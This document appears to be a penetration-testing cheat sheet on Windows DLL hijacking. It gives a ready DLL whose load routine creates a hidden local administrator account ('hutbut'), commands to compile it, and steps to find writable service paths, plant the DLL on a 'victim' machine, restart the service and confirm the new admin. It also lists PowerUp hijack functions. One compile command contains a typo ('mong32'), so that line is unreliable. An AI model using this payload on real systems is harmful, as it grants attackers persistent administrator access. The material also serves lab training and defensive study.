# DLL-Hijacking
### Step-by-Step:
```cpp
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(
	HANDLE hModule,
	DWORD ul_reason_for_call,
	LPVOID lpReserved)
{
	switch ( ul_reason_for_call ) {
	case DLL_PROCESS_ATTACH:
		int i;
		i = system("net user hutbut hutbut! /add");
		i = system("net localgroup administrators hutbut /add");
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```

Compile using:
```bash
# cross compile regular code:
	x86_64-w64-mingw32-gcc name_of_prg.c -o name_of_binary.exe
	# turn the output into a dynamically linked loader (DLL):
	x86_64-w64-mong32-gcc name_of_prg.cpp --shared -o name_of_DLL.dll
```

#### Complete Process - Manual
Get a list of running services:
```PowerShell
Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object {$_.State -like "Running"}
```

Then check the permissions for the path that the service is on:
```PowerShell
icacls ".\Path\To\The\Service.exe"
```

```
(I) - INHERITED PERMISSIONS
(F) - FULL PERMISSIONS
(R,W,X) - READ, WRITE & EXECUTE PERMISSIONS
```

You need access to `Procmon.exe` in order to check for the DLLs that are being loaded by the service binary.

The structure of the DLL is something like this:
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
	HANDLE hModule,
	DWORD ul_reason_for_call,
	LPVOID lpReserved) {
	
	switch ( ul_reason_for_call ) {
		case DLL_PROCESS_ATTACH:
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}
```

Generally for running powershell commands using C++ the following syntax is used:
```cpp
#include <stdlib.h>

int main() {
	int i;
	i = system("net user USERNAME PASSWORD /add");
	i = system("net localgroup GROUPNAME USERNAME /add");
	return 0;
}
```

After compiling, send it to the hijack path on the victim VM and restart the service that uses the hijacked DLL:
```PowerShell
Restart-Service service_name;
# now check if the user has been created:
Get-LocalGroupMember Administrators;
```

#### Complete Process - PowerSploit (PowerUp.ps1)
Import the PowerUp script:
```PowerShell
. .\PowerUp.ps1;
# now run:
Invoke-AllChecks
```
This checks everything. It may also give you an `AbuseFunction`.
```PowerShell
# powerup modules
Find-ProcessDLLHijack
Find-PathDLLHijack
Write-HijackDLL
```